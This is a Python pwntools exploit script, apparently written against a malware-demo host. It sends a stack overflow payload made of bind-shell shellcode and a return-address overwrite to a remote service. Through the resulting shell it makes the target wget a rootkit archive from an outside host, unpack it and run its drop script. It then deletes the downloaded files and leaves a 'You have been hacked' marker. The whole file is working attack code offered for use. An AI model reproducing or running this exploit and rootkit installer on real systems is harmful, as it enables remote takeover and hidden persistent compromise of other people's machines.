from pwn import *

context.arch = 'amd64'

base_addr = 0x7fffffffea80                # given by program (inside docker container)
diff = 0x7fffffffdd38 - 0x7fffffffdb20    # determined from gdb

target_addr = 'mw-demo.roryhemmings.com'
target_port = 2000
stage_two_port = 2002

rootkit_download_addr = 'mw-demo.roryhemmings.com/rootkit.tz'
rootkit_filename = 'rootkit.tz'

# Set up the connection to the target system
target = remote(target_addr, target_port)

# Generate the stage 1 shellcode to connect to the target
stage1_shellcode = shellcraft.amd64.linux.bindsh(stage_two_port, target_addr)

# Assemble and send the stage 1 shellcode to the target system
assembled_stage1_shellcode = asm(stage1_shellcode)

padding = b'\0' * (diff - 1 - len(assembled_stage1_shellcode))
raddr = p64(base_addr + 1)

payload = b'\0' + assembled_stage1_shellcode + padding + raddr
target.send(payload)

# Connect to bind shell and install rootkit
setup_target = remote(target_addr, stage_two_port)
setup_target.sendline(f'wget {rootkit_download_addr}'.encode('ascii'))
setup_target.sendline(f'tar -xzf {rootkit_filename}'.encode('ascii'))
setup_target.sendline('./drop.sh'.encode('ascii'))
setup_target.sendline(f'rm {rootkit_filename}'.encode('ascii'))
setup_target.sendline('rm rootkit.so'.encode('ascii'))
setup_target.sendline('rm ./drop.sh'.encode('ascii'))
setup_target.sendline('echo "You have been hacked" > hacked.txt'.encode('ascii'))
setup_target.recvuntil('done'.encode('ascii'))

setup_target.close()
target.close()
